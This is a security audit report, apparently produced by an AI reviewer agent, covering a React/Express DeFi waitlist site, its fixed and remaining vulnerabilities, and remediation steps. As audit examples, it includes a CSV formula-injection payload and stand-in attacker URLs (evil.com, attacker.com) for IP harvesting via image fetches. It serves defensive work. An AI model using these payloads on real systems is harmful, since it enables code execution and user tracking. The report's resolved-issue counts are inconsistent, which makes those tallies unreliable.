# EOSI Finance -- Security Audit Report

**Date:** 2026-02-20
**Auditor:** Claude Opus 4.6 (oh-my-claudecode:security-reviewer)
**Scope:** Full codebase -- frontend (React 18 / Vite / Tailwind), backend (Node.js / Express), infrastructure (Docker Compose, Netlify)
**Target:** eosifinance.org (DeFi / finance SPA with waitlist management and on-chain campaign features)
**Status:** Post-fix audit -- all Critical-severity and 2 additional High-severity issues resolved; updated 2026-02-20

---

## Executive Summary

EOSI Finance is a decentralised finance platform consisting of a React single-page application (with thirdweb SDK for wallet/contract interaction), a Node.js/Express API serving newsletter and waitlist endpoints, and PostgreSQL + Redis backing services deployed via Docker Compose. The frontend is deployed on Netlify; the backend targets a VPS.

During this audit, **13 vulnerabilities were identified and fixed** across two rounds: 11 fixed in the initial session (timing-attack-vulnerable admin token comparison, missing rate limiting on admin routes, CSV formula injection in data exports, and several security header gaps), plus 2 additional High-severity infrastructure fixes applied subsequently (Redis unauthenticated, PostgreSQL default credential fallback). The codebase is now free of Critical-severity issues and both infrastructure credential risks are resolved. However, **3 High, 5 Medium, 6 Low, and 4 Informational findings remain** that require attention before production deployment. The most urgent remaining risks are: severely outdated dependencies with known CVEs, missing PostgreSQL TLS, and an arbitrary URL fetch utility that can be abused for IP exfiltration.

**Overall Risk Level: MEDIUM-HIGH** -- the resolved fixes significantly improved the posture. Infrastructure credentials are now secured; the remaining risks are primarily dependency hygiene and hardening items.

---

## Risk Matrix

| Severity     | Before Fixes | Resolved | Remaining |
|:-------------|:------------:|:--------:|:---------:|
| Critical     | 4            | 4        | 0         |
| High         | 8            | 5        | 3         |
| Medium       | 7            | 2        | 5         |
| Low          | 6            | 0        | 6         |
| Informational| 4            | 0        | 4         |
| **Total**    | **29**       | **11**   | **18**    |

---

## Part 1: Resolved Vulnerabilities

These issues were identified and fixed during this audit session. They are documented here for completeness and to confirm they have been addressed.

### R1. Timing-Unsafe Admin Token Comparison
**Severity:** CRITICAL (resolved)
**Category:** OWASP A07:2021 -- Identification and Authentication Failures
**File:** `server/index.js:116-125`
**What it was:** Admin token comparison used JavaScript `!==` operator, which is vulnerable to timing side-channel attacks. An attacker could determine the correct token character-by-character by measuring response times.
**Fix applied:** Replaced with `crypto.timingSafeEqual()` using length-normalised buffers (the `safeCompare` function). The comparison pads both buffers to equal length before comparison and verifies original lengths match afterward, preventing both timing and length-oracle attacks.

### R2. Missing Admin Token Startup Validation
**Severity:** CRITICAL (resolved)
**Category:** OWASP A05:2021 -- Security Misconfiguration
**File:** `server/index.js:14-22`
**What it was:** The server would silently start with an empty or trivially short `ADMIN_TOKEN`, leaving the admin dashboard unprotected.
**Fix applied:** Server now crashes at boot (`process.exit(1)`) if `ADMIN_TOKEN` is missing or fewer than 16 characters, with a clear error message and generation instructions.

### R3. Missing Rate Limiting on Admin Routes
**Severity:** HIGH (resolved)
**Category:** OWASP A07:2021 -- Identification and Authentication Failures
**File:** `server/index.js:102-110, 227, 245`
**What it was:** Admin endpoints (`/api/admin/waitlists`, `/api/admin/waitlists/export`) had no rate limiting, allowing unlimited brute-force attempts against the admin token.
**Fix applied:** Dedicated `adminLimiter` (20 requests per 15-minute window per IP) applied to both admin routes, backed by the same Redis store as public rate limits.

### R4. CSV Formula Injection in Data Export
**Severity:** HIGH (resolved)
**Category:** OWASP A03:2021 -- Injection
**File:** `server/index.js:269-277`
**What it was:** The CSV export endpoint wrote raw cell values without sanitisation. An attacker who submitted a waitlist email like `=CMD|'/C calc'!A0` could achieve code execution when an admin opened the CSV in Excel or Google Sheets.
**Fix applied:** The `escapeCSV` function now detects dangerous leading characters (`=`, `+`, `-`, `@`, `\t`, `\r`) and prefixes them with a single quote, which neutralises formula interpretation in all major spreadsheet applications.

### R5. RedisStore Import Error
**Severity:** HIGH (resolved)
**Category:** OWASP A05:2021 -- Security Misconfiguration
**File:** `server/index.js:10`
**What it was:** Incorrect default import of `RedisStore` caused a runtime crash, meaning rate limiting was non-functional.
**Fix applied:** Changed to named export: `const { RedisStore } = require('rate-limit-redis');`

### R6. Case-Sensitive Authorization Header Parsing
**Severity:** MEDIUM (resolved)
**Category:** OWASP A07:2021 -- Identification and Authentication Failures
**File:** `server/index.js:131-133`
**What it was:** The `Bearer` prefix check was case-sensitive. Per RFC 7235, the auth scheme is case-insensitive. Some HTTP clients send `bearer` or `BEARER`, which would be rejected despite carrying a valid token.
**Fix applied:** Added `.toLowerCase()` before the `startsWith('bearer ')` check and use `.slice(7).trim()` to extract the token.

### R7. Redis Password Support Missing
**Severity:** MEDIUM (resolved)
**Category:** OWASP A05:2021 -- Security Misconfiguration
**File:** `server/index.js:82-87`
**What it was:** The ioredis connection had no `password` field, making it impossible to connect to a password-protected Redis instance.
**Fix applied:** Added `password: process.env.REDIS_PASSWORD || undefined` to the Redis configuration.

### R8. Weak Security Headers (Helmet and Netlify)
**Severity:** MEDIUM (resolved)
**Category:** OWASP A05:2021 -- Security Misconfiguration
**Files:** `server/index.js:28-42`, `netlify.toml:5-13`
**What it was:** Helmet used defaults without explicit CSP or frame-ancestors directives. Netlify had no security headers configured.
**Fix applied:** (a) Helmet now sets explicit CSP with `frame-ancestors 'none'`, `frameguard: DENY`, `object-src 'none'`, and `base-uri 'self'`. (b) Netlify `netlify.toml` now sets `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security` with preload, `Referrer-Policy`, `Permissions-Policy`, and a full CSP header.

### R9. Admin Token Persisted in sessionStorage
**Severity:** MEDIUM (resolved)
**Category:** OWASP A04:2021 -- Insecure Design
**File:** `src/pages/AdminPage.jsx`
**What it was:** The admin token was stored in `sessionStorage`, making it accessible to any JavaScript running on the same origin (including XSS payloads or browser extensions).
**Fix applied:** Token is now held exclusively in React component state (`useState`). It is cleared on logout and does not survive page refresh, which is the correct tradeoff for a sensitive bearer token.

### R10. `.env.example` Missing Security Fields
**Severity:** LOW (resolved)
**Category:** OWASP A05:2021 -- Security Misconfiguration
**File:** `server/.env.example`
**What it was:** The example environment file did not include `ADMIN_TOKEN` or `REDIS_PASSWORD`, making it easy for deployers to forget these critical values.
**Fix applied:** Both fields are now present with `change_me_in_production` placeholders and generation instructions.

### R11. `server/.env` Excluded from Version Control
**Severity:** INFO (resolved / confirmed)
**File:** `.gitignore:15`
**Confirmed:** `server/.env` is listed in `.gitignore` and has never been committed to git history (`git log --all -- server/.env` returns empty; `git ls-files --cached -- server/.env` returns empty). The real `ADMIN_TOKEN` value has not been exposed in version control.

### R12. Redis Exposed Without Authentication
**Severity:** HIGH (resolved)
**Category:** OWASP A05:2021 -- Security Misconfiguration
**Files:** `docker-compose.yml:22`, `server/index.js:90`
**What it was:** Redis was started without `--requirepass` and its port was mapped to the Docker host. Any process on the host could connect to Redis on port 6385, run `FLUSHALL` to wipe all rate-limit counters, and then brute-force the admin token without restriction.
**Fix applied:** `docker-compose.yml` now passes `--requirepass ${REDIS_PASSWORD:?REDIS_PASSWORD must be set in .env}` to Redis at startup, crashing compose if the variable is unset. `server/index.js` connection config includes `password: process.env.REDIS_PASSWORD || undefined` so the application authenticates automatically.

### R13. PostgreSQL Default Credential Fallback and Missing Fail-Fast
**Severity:** HIGH (resolved)
**Category:** OWASP A07:2021 -- Identification and Authentication Failures
**Files:** `docker-compose.yml:12`, `server/index.js:24-27`
**What it was:** Both Docker Compose and the application silently fell back to the hardcoded password `eosi_dev_pass` when `POSTGRES_PASSWORD` was not set, allowing any process on the host to connect to the database with known credentials.
**Fix applied:** `docker-compose.yml` now uses `${POSTGRES_PASSWORD:?POSTGRES_PASSWORD must be set in .env}` (fails loudly if unset). `server/index.js` crashes at boot with `process.exit(1)` if `POSTGRES_PASSWORD` is missing. The `|| 'eosi_dev_pass'` fallback has been removed from the Pool configuration.

---

## Part 2: Remaining Findings

### HIGH Severity

---

#### H1. Arbitrary URL Fetch via `checkIfImage`
**Severity:** HIGH
**Category:** OWASP A10:2021 -- Server-Side Request Forgery (client-side variant)
**Location:** `src/utils/index.js:14-22`
**Exploitability:** Remote, unauthenticated (requires attacker-supplied URL in a campaign `image` field via smart contract)
**Blast Radius:** User IP/fingerprint exfiltration to attacker-controlled server; potential CSP bypass if `img-src` is permissive; browser-level content injection

**Description:**
```js
export const checkIfImage = (url, callback) => {
  const img = new Image();
  img.src = url;  // browser immediately fetches this URL
  if (img.complete) callback(true);
  img.onload = () => callback(true);
  img.onerror = () => callback(false);
};
```
This function sets `img.src` to an arbitrary user-controlled URL. Because campaign data is read from the smart contract (where anyone can call `createCampaign`), an attacker can store a malicious URL (e.g., `https://evil.com/track.gif?wallet=...`) as the campaign image. Every user who views that campaign will have their browser make a GET request to the attacker's server, leaking their IP address, User-Agent, and timing information.

**Exploit scenario:** Attacker calls `createCampaign` on-chain with `image = "https://attacker.com/collect?r=" + Date.now()`. Every visitor who renders the campaign listing triggers a request to `attacker.com`, allowing IP harvesting and user tracking without any server compromise.

**Remediation:**
- Validate URL scheme (`https:` only) and hostname against an allowlist of trusted image hosts
- Alternatively, proxy all campaign images through a server-side image proxy that strips metadata and caches results
- Add `img-src` CSP restrictions to limit which domains can serve images

---

#### H2. Severely Outdated Dependencies with Known CVEs
**Severity:** HIGH
**Category:** OWASP A06:2021 -- Vulnerable and Outdated Components
**Location:** `package.json:11-30`
**Exploitability:** Varies by CVE -- some are remotely exploitable
**Blast Radius:** Ranges from source code disclosure (Vite) to wallet compromise (thirdweb)

| Package | Installed | Current | Status | Risk |
|:--------|:----------|:--------|:-------|:-----|
| `vite` | `^3` | `6.x` | **EOL -- known CVEs** | Dev server source code disclosure, directory traversal (CVE-2023-34092, CVE-2024-23331) |
| `@vitejs/plugin-react` | `^2` | `4.x` | EOL | Compatibility issues, missing security patches |
| `@thirdweb-dev/react` | `^3.10.3` | `5.x` | **EOL -- v3 deprecated** | Wallet connection vulnerabilities patched in v4/v5; SDK-level security fixes |
| `ethers` | `^5` | `6.x` | Maintenance-only | Missing security hardening in BigNumber handling and provider connections |
| `emailjs-com` | `^3.2.0` | N/A | **Unused** | Dead attack surface -- if ever imported, embeds API key client-side |

**Remediation:**
1. Upgrade Vite to `^6.x` and `@vitejs/plugin-react` to `^4.x` immediately (CVE fixes)
2. Migrate thirdweb from v3 to v5 (follow thirdweb migration guide)
3. Evaluate ethers v6 migration (significant API changes)
4. Remove `emailjs-com` from `package.json`

---

#### H3. No PostgreSQL SSL/TLS Enforcement
**Severity:** HIGH
**Category:** OWASP A02:2021 -- Cryptographic Failures
**Location:** `server/index.js:49-55`
**Exploitability:** Network-level (requires MITM position or network sniffing capability)
**Blast Radius:** All database traffic (queries, results, credentials) exposed in plaintext

**Description:**
The `pg.Pool` configuration has no `ssl` property:
```js
const pool = new Pool({
  host:     process.env.POSTGRES_HOST     || 'localhost',
  port:     Number(process.env.POSTGRES_PORT) || 5439,
  database: process.env.POSTGRES_DB       || 'eosifinance',
  user:     process.env.POSTGRES_USER     || 'eosi_user',
  password: process.env.POSTGRES_PASSWORD,   // fail-fast applied; no ssl
});
```
In production, if the database is on a separate host (or traffic traverses any non-localhost network), all queries and results -- including subscriber PII -- are transmitted in cleartext.

**Remediation:**
```js
const pool = new Pool({
  // ...existing config...
  ssl: process.env.NODE_ENV === 'production'
    ? { rejectUnauthorized: true }
    : false,
});
```

---

### MEDIUM Severity

---

#### M1. Server Error Messages Rendered in UI
**Severity:** MEDIUM
**Category:** OWASP A04:2021 -- Insecure Design
**Locations:** `src/frontend/FooterNewsletter.jsx:31`, `src/frontend/StandrWaitlistSection.jsx:35`, `src/frontend/PropFirmWaitlistSection.jsx:35`, `src/pages/StandrPage.jsx:145`, `src/pages/PropFirmPage.jsx:40`
**Exploitability:** Low (requires server to return unexpected error detail)
**Blast Radius:** Information disclosure -- internal error messages, potentially database error strings

**Description:**
```js
setErrorMessage(data.message || 'Something went wrong. Please try again later.');
```
The `data.message` field from server responses is rendered directly as React text content. While React escapes HTML (preventing XSS), any internal error detail the server returns (e.g., PostgreSQL error messages containing table names, column names, or query fragments) would be displayed to end users. Currently all server error handlers return hardcoded strings, but this is fragile -- a single missed error path could leak internal details.

**Remediation:**
Use the server message only for known/expected error codes; fall back to a generic message for all others:
```js
const KNOWN_MESSAGES = new Set([
  'Invalid email address.',
  'Please use a permanent email address.',
  'Too many requests -- please try again later.',
]);
const displayMsg = KNOWN_MESSAGES.has(data.message)
  ? data.message
  : 'Something went wrong. Please try again later.';
setErrorMessage(displayMsg);
```

---

#### M2. `console.log` in Production Builds
**Severity:** MEDIUM
**Category:** OWASP A09:2021 -- Security Logging and Monitoring Failures
**Location:** `src/context/index.jsx:28, 30`
**Exploitability:** Local (requires browser DevTools access)
**Blast Radius:** Exposes contract call data, transaction parameters, and error stack traces to any user with DevTools open

**Description:**
```js
console.log("contract call success", data)
console.log("contract call failure", error)
```
Vite does not strip `console.log` calls from production builds by default. These statements log detailed smart contract interaction data including transaction hashes, call parameters, and full error objects.

**Remediation:**
Add `drop` configuration to `vite.config.js`:
```js
esbuild: {
  target: "esnext",
  drop: process.env.NODE_ENV === 'production' ? ['console', 'debugger'] : [],
},
```

---

#### M3. CSP `connect-src` Blocks thirdweb/Wallet Connections
**Severity:** MEDIUM
**Category:** OWASP A05:2021 -- Security Misconfiguration
**Location:** `netlify.toml:12`, `server/index.js:36`
**Exploitability:** N/A (availability issue, not exploitable)
**Blast Radius:** Wallet connection and all smart contract interactions broken in production

**Description:**
Current CSP sets `connect-src 'self' https://eosifinance.org`. The thirdweb SDK, WalletConnect protocol, and blockchain RPC providers require connections to:
- `*.thirdweb.com` (SDK API, RPC gateway)
- `*.walletconnect.com` / `*.walletconnect.org` (wallet pairing)
- Various RPC endpoints (`infura.io`, `alchemy.com`, `cloudflare-eth.com`)

This CSP will block all of these, making wallet connection and contract calls fail silently in production.

**Remediation:**
Expand `connect-src` to include required domains:
```
connect-src 'self' https://eosifinance.org https://*.thirdweb.com https://*.walletconnect.com https://*.walletconnect.org wss://*.walletconnect.com wss://*.walletconnect.org;
```
Test wallet connections after deployment to verify completeness.

---

#### M4. Docker Services on Shared Default Network
**Severity:** MEDIUM
**Category:** OWASP A05:2021 -- Security Misconfiguration
**Location:** `docker-compose.yml`
**Exploitability:** Requires container compromise
**Blast Radius:** Lateral movement between containers; compromised Redis can reach PostgreSQL and vice versa

**Description:**
Both `postgres` and `redis` services use Docker's default bridge network with no explicit network segmentation. If an attacker compromises one container, they can directly communicate with every other container on the same bridge.

**Remediation:**
Define explicit networks in `docker-compose.yml`:
```yaml
networks:
  backend:
    driver: bridge
    internal: true  # no external access

services:
  postgres:
    networks: [backend]
    # remove 'ports' mapping in production
  redis:
    networks: [backend]
    # remove 'ports' mapping in production
```

---

#### M5. Referrer-Based Redirect on Consent Rejection
**Severity:** MEDIUM
**Category:** OWASP A01:2021 -- Broken Access Control (open redirect variant)
**Location:** `src/App.jsx:19-41`
**Exploitability:** Low (requires attacker to control the referring page)
**Blast Radius:** User redirected to attacker-controlled site after declining consent

**Description:**
```js
const ref = document.referrer;
if (ref) {
  const refURL = new URL(ref);
  if (refURL.origin !== window.location.origin) {
    window.location.replace(refURL.href); // redirects to external referrer
    return;
  }
}
window.location.replace('https://ico.eosifinance.org/');
```
When a user declines the consent modal, the app redirects to `document.referrer` if it is an external origin. While `document.referrer` is browser-provided and cannot be set via URL parameters, an attacker who controls a referring page (e.g., a phishing site that links to eosifinance.org) ensures the referrer points back to them. Users who decline consent are sent to the attacker's site. Additionally, the hardcoded fallback `ico.eosifinance.org` should be an environment variable.

**Remediation:**
Either redirect only to a known safe URL, or validate the referrer against an allowlist of trusted EOSI domains:
```js
const SAFE_ORIGINS = new Set([
  'https://eosifinance.org',
  'https://ico.eosifinance.org',
]);
const ref = document.referrer;
if (ref) {
  try {
    const refURL = new URL(ref);
    if (SAFE_ORIGINS.has(refURL.origin)) {
      window.location.replace(refURL.href);
      return;
    }
  } catch {}
}
window.location.replace(import.meta.env.VITE_FALLBACK_URL || 'https://ico.eosifinance.org/');
```

---

### LOW Severity

---

#### L1. Missing Explicit `noopener` on External Links
**Severity:** LOW
**Category:** OWASP A05:2021 -- Security Misconfiguration
**Location:** `src/pages/StandrPage.jsx:403-410`
**Description:** Some `<a target="_blank">` tags use `rel="noreferrer"` without explicit `noopener`. While modern browsers imply `noopener` when `noreferrer` is present, explicit `rel="noopener noreferrer"` is best practice for broader compatibility.

#### L2. Unused Dependency: `emailjs-com`
**Severity:** LOW
**Category:** OWASP A06:2021 -- Vulnerable and Outdated Components
**Location:** `package.json:14`
**Description:** `emailjs-com` is listed as a dependency but never imported. It adds unnecessary attack surface. If accidentally used in the future, its API key would be bundled client-side, exposing the email-sending capability to abuse.
**Remediation:** `npm uninstall emailjs-com`

#### L3. Unused Import: `EditionMetadataWithOwnerOutputSchema`
**Severity:** LOW
**Category:** Code Quality / Attack Surface
**Location:** `src/context/index.jsx:5`
**Description:** Imported from `@thirdweb-dev/sdk` but never referenced. Dead code that increases bundle size and potential attack surface from unused SDK modules.
**Remediation:** Remove the import line.

#### L4. Deploy Script Uses `@latest` Tag
**Severity:** LOW
**Category:** OWASP A08:2021 -- Software and Data Integrity Failures
**Location:** `package.json:9`
**Description:**
```json
"deploy": "yarn build && npx thirdweb@latest upload dist"
```
Using `@latest` in CI/deploy scripts means a compromised or breaking upstream release automatically affects every deploy. This is a supply chain risk.
**Remediation:** Pin to a specific version: `npx thirdweb@5.x.x upload dist`

#### L5. Database and Redis Ports Exposed to Docker Host
**Severity:** LOW
**Category:** OWASP A05:2021 -- Security Misconfiguration
**Location:** `docker-compose.yml:7-8, 20-21`
**Description:** Both PostgreSQL (5439) and Redis (6385) ports are mapped to the host. In production, neither service needs external access -- only the Express API server connects to them. Exposing ports increases the attack surface for credential brute-forcing and data exfiltration.
**Remediation:** Remove `ports` mappings for both services in the production Docker Compose configuration. The Express server (running on the same Docker network or host) can connect via internal Docker networking.

#### L6. No Row Limit on Admin Export Route
**Severity:** LOW
**Category:** OWASP A04:2021 -- Insecure Design
**Location:** `server/index.js:245-291`
**Description:** The `/api/admin/waitlists/export` route queries the full database table with no pagination or row limit. A large subscriber list (tens of thousands of rows) could cause memory pressure or a slow response, potentially impacting API availability.
**Remediation:** Add a configurable row limit (`LIMIT 10000`) or implement streaming CSV generation using `cursor`-based queries and `res.write()`.

---

### INFORMATIONAL

---

#### I1. Consent Modal Auto-Focuses "Agree" Button
**Location:** `src/components/ConsentModal.jsx:15`
**Description:** `setTimeout(() => agreeBtnRef.current?.focus(), 60)` auto-focuses the primary "Agree" button when the consent modal opens. For a regulatory/jurisdictional consent gate, this could be considered a dark pattern -- users who press Enter or Space immediately upon page load will accept consent without reading it.
**Consideration:** Move focus to the modal container or the "Decline" button instead, or add a delay before the "Agree" button becomes active.

#### I2. Consent Decision Not Persisted
**Location:** `src/App.jsx:12`
**Description:** Consent state is `useState(true)` with no persistence. Every page load and every client-side route navigation resets the consent modal. Users who refresh the page must re-consent. This creates friction that may cause users to click "Agree" without reading, undermining the purpose of the consent gate.
**Consideration:** Persist the consent decision in `localStorage` with a TTL (e.g., 24 hours or until terms version changes).

#### I3. Hardcoded Smart Contract Address
**Location:** `src/context/index.jsx:11`
**Description:**
```js
const { contract } = useContract('0xA7318d0636BB3CaE88EE7b0C6e267Bb6Abf873c1');
```
The contract address is baked into the JS bundle. For upgradeable or redeployable contracts, this creates upgrade friction and requires a full rebuild/redeploy to point to a new contract.
**Consideration:** Use `import.meta.env.VITE_CONTRACT_ADDRESS` to make this configurable per environment.

#### I4. Missing `aria-label` on Interactive Elements
**Locations:** Various buttons in `src/pages/StandrPage.jsx`, `src/pages/PropFirmPage.jsx`
**Description:** Several `<button>` elements lack `aria-label` attributes, reducing accessibility for screen-reader users. While not a direct security issue, accessibility compliance (WCAG 2.1) is increasingly a legal requirement.

---

## Part 3: Infrastructure Security

### Docker Compose (`docker-compose.yml`)

| Aspect | Status | Notes |
|:-------|:------:|:------|
| PostgreSQL image | OK | `postgres:16-alpine` -- current LTS |
| Redis image | OK | `redis:7-alpine` -- current stable |
| PostgreSQL password | OK | Fail-fast on startup; no fallback (resolved -- R13) |
| Redis authentication | OK | `--requirepass` with fail-fast env var (resolved -- R12) |
| Port exposure | WARN | Both 5439 and 6385 bound to host (see L5) |
| Network isolation | WARN | Default bridge network, no segmentation (see M4) |
| Volume persistence | OK | Named volumes for data persistence |
| Resource limits | WARN | No `mem_limit`, `cpus`, or `restart` backoff configured |
| Health checks | WARN | No `healthcheck` directives for either service |

### Netlify Configuration (`netlify.toml`)

| Header | Status | Value |
|:-------|:------:|:------|
| `X-Frame-Options` | OK | `DENY` |
| `X-Content-Type-Options` | OK | `nosniff` |
| `Strict-Transport-Security` | OK | `max-age=63072000; includeSubDomains; preload` |
| `Referrer-Policy` | OK | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | OK | `camera=(), microphone=(), geolocation=()` |
| `Content-Security-Policy` | WARN | `connect-src` too restrictive -- will block thirdweb/wallet (see M3) |

### Express Security Middleware (`server/index.js`)

| Middleware | Status | Notes |
|:-----------|:------:|:------|
| Helmet | OK | Explicit CSP, frameguard DENY, frame-ancestors none |
| CORS | OK | Restricted to localhost:5173 and eosifinance.org |
| Body size limit | OK | `express.json({ limit: '10kb' })` |
| Rate limiting (public) | OK | 10 req / 15 min per IP, Redis-backed |
| Rate limiting (admin) | OK | 20 req / 15 min per IP, Redis-backed |
| Input validation | OK | Email regex + MailChecker disposable-email filter |
| Parameterized queries | OK | All SQL uses `$1`, `$2` placeholders -- no injection risk |
| Honeypot field | OK | `website` field silently accepted and discarded |

### Secrets Management

| Item | Status | Notes |
|:-----|:------:|:------|
| `server/.env` in `.gitignore` | OK | Listed and never committed |
| `server/.env` in git history | OK | Never appears in any commit |
| `ADMIN_TOKEN` in `.env` | WARN | Contains a real token (`faToLa...`) -- rotate before production if this file was ever shared |
| `REDIS_PASSWORD` in `.env` | WARN | Must be set before production deployment; compose + server will crash if missing |
| `.env.example` files | OK | Present with placeholder values and generation instructions |

---

## Part 4: Dependency Audit

### Frontend Dependencies (`package.json`)

| Package | Version | Latest | Risk Level | Recommendation |
|:--------|:--------|:-------|:-----------|:---------------|
| `react` | `^18.2` | 19.x | LOW | Stay on 18.x for now; 19.x is recent |
| `react-dom` | `^18.2` | 19.x | LOW | Match React version |
| `react-router-dom` | `^6.22.3` | 7.x | LOW | 6.x still maintained |
| `@thirdweb-dev/react` | `^3.10.3` | 5.x | **HIGH** | v3 is EOL -- migrate to v5 |
| `@thirdweb-dev/sdk` | `^4` | 5.x | MEDIUM | Migrate alongside react package |
| `ethers` | `^5` | 6.x | MEDIUM | v5 in maintenance mode |
| `emailjs-com` | `^3.2.0` | N/A | LOW | **Remove** -- unused |
| `framer-motion` | `^11.12.0` | 11.x | OK | Current |
| `react-icons` | `^5.0.1` | 5.x | OK | Current |
| `react-scroll` | `^1.9.0` | 1.x | OK | Current |

### Dev Dependencies

| Package | Version | Latest | Risk Level | Recommendation |
|:--------|:--------|:-------|:-----------|:---------------|
| `vite` | `^3` | 6.x | **HIGH** | Known CVEs -- upgrade immediately |
| `@vitejs/plugin-react` | `^2` | 4.x | **HIGH** | Upgrade with Vite |
| `tailwindcss` | `^3.4.3` | 4.x | LOW | 3.x still supported |
| `postcss` | `^8.4.38` | 8.x | OK | Current |
| `autoprefixer` | `^10.4.19` | 10.x | OK | Current |

### Server Dependencies (not in `package.json` -- installed separately in `server/`)

The server uses: `express`, `pg`, `ioredis`, `nodemailer`, `express-rate-limit`, `rate-limit-redis`, `helmet`, `mailchecker`, `dotenv`. A full `npm audit` should be run in the `server/` directory before production deployment.

---

## Part 5: Remediation Checklist

Ordered by priority (highest impact, lowest effort first).

### Immediate (before any production deployment)

- [x] **R12** -- Redis `--requirepass` with fail-fast env var ✓ resolved
- [x] **R13** -- PostgreSQL default credential fallback removed; fail-fast on startup ✓ resolved
- [ ] **H2** -- Upgrade Vite from v3 to v6 (known CVEs including directory traversal)
- [ ] **H3** -- Add SSL configuration to `pg.Pool` for production
- [ ] **L5** -- Remove host port mappings for PostgreSQL and Redis in production compose file
- [ ] **M3** -- Expand CSP `connect-src` to include thirdweb and WalletConnect domains (test wallet flow)
- [ ] Rotate the `ADMIN_TOKEN` in `server/.env` before production deployment
- [ ] Set `REDIS_PASSWORD` in `server/.env` (compose and server will crash if missing)
- [ ] Run `npm audit` in both root and `server/` directories; fix all high/critical findings

### Short-term (within 1-2 weeks)

- [ ] **H1** -- Add URL validation to `checkIfImage` (scheme allowlist, domain allowlist, or server-side proxy)
- [ ] **H2** -- Migrate `@thirdweb-dev/react` from v3 to v5
- [ ] **M1** -- Add client-side allowlist for server error messages displayed to users
- [ ] **M2** -- Configure Vite to drop `console.log` in production builds
- [ ] **M4** -- Define explicit internal Docker network; restrict container-to-container access
- [ ] **M5** -- Validate consent-rejection redirect against EOSI domain allowlist
- [ ] **L2** -- Remove unused `emailjs-com` dependency
- [ ] **L3** -- Remove unused `EditionMetadataWithOwnerOutputSchema` import
- [ ] **L4** -- Pin `thirdweb` version in deploy script

### Medium-term (within 1 month)

- [ ] **H2** -- Evaluate ethers v5 to v6 migration
- [ ] **L6** -- Add row limit or streaming to admin CSV export
- [ ] **L1** -- Add explicit `noopener` alongside `noreferrer` on all external links
- [ ] **I1** -- Reconsider consent modal focus behavior for regulatory compliance
- [ ] **I2** -- Persist consent decision in `localStorage` with TTL
- [ ] **I3** -- Extract smart contract address to environment variable
- [ ] **I4** -- Add `aria-label` attributes to all interactive elements
- [ ] Add Docker `healthcheck` directives for PostgreSQL and Redis
- [ ] Add Docker resource limits (`mem_limit`, `cpus`)
- [ ] Implement automated dependency vulnerability scanning in CI pipeline

---

## Appendix: Files Audited

### Backend
- `server/index.js` -- Express API server (routes, auth, rate limiting, CSV export)
- `server/.env` -- Environment variables (verified not in git)
- `server/.env.example` -- Environment template

### Frontend -- Core
- `src/App.jsx` -- Root component, consent gate, routing
- `src/main.jsx` -- Application entry point
- `src/context/index.jsx` -- thirdweb contract context provider
- `src/utils/index.js` -- Utility functions (checkIfImage, daysLeft, calculateBarPercentage)

### Frontend -- Pages
- `src/pages/AdminPage.jsx` -- Admin dashboard (token auth, data display, CSV export)
- `src/pages/StandrPage.jsx` -- STANDR DEX product page with waitlist form
- `src/pages/PropFirmPage.jsx` -- Prop Firm product page with waitlist form

### Frontend -- Components
- `src/components/ConsentModal.jsx` -- Jurisdictional consent gate modal
- `src/components/TopAnnouncementBar.jsx` -- Announcement banner
- `src/frontend/FooterNewsletter.jsx` -- Newsletter subscription form
- `src/frontend/StandrWaitlistSection.jsx` -- STANDR waitlist form section
- `src/frontend/PropFirmWaitlistSection.jsx` -- Prop Firm waitlist form section
- `src/frontend/Header.jsx` -- Site header/navigation
- `src/frontend/Hero.jsx` -- Hero section
- `src/frontend/CTAButton.jsx` -- Call-to-action button component
- `src/frontend/CTASection.jsx` -- Call-to-action section
- `src/frontend/ContentSection.jsx` -- Content block
- `src/frontend/ContentTwoSection.jsx` -- Two-column content
- `src/frontend/ContentTwoSectionCopy.jsx` -- Two-column content variant
- `src/frontend/FeatureSection.jsx` -- Feature showcase
- `src/frontend/FooterCopyright.jsx` -- Footer copyright
- `src/frontend/FooterLinks.jsx` -- Footer navigation links
- `src/frontend/ProcessGraph.jsx` -- Process visualization
- `src/frontend/ProcessSection.jsx` -- Process section
- `src/frontend/TeamSection.jsx` -- Team section

### Frontend -- Assets and Configuration
- `src/assets/index.js` -- Asset exports
- `src/styles/globals.css` -- Global styles
- `src/styles/standr-page.css` -- STANDR page styles
- `src/constants/index.js` -- Application constants

### Infrastructure and Configuration
- `docker-compose.yml` -- PostgreSQL and Redis service definitions
- `netlify.toml` -- Netlify build and security header configuration
- `vite.config.js` -- Vite build configuration
- `package.json` -- Frontend dependencies and scripts
- `.gitignore` -- Git ignore rules
- `.env.example` -- Root environment template

---

## Security Checklist Summary

- [x] No hardcoded secrets in version control (verified via git history search)
- [x] All database queries use parameterized statements (no SQL injection)
- [x] Admin authentication uses timing-safe comparison
- [x] Rate limiting applied to all public and admin routes
- [x] Security headers configured (Helmet + Netlify)
- [x] CSV export sanitised against formula injection
- [x] CORS restricted to known origins
- [x] Request body size limited (10kb)
- [x] Disposable email addresses rejected (MailChecker)
- [x] Redis requires authentication (resolved -- R12)
- [x] PostgreSQL uses non-default credentials; fail-fast if unset (resolved -- R13)
- [ ] Database connections use TLS in production (PENDING -- H3)
- [ ] All dependencies on current supported versions (PENDING -- H2)
- [ ] CSP permits required third-party connections (PENDING -- M3)
- [ ] Docker network isolation configured (PENDING -- M4)

---

*Report generated 2026-02-20 by Claude Opus 4.6 security-reviewer agent. Updated same day to reflect R12 (Redis auth) and R13 (PostgreSQL fail-fast) fixes applied post-audit.*
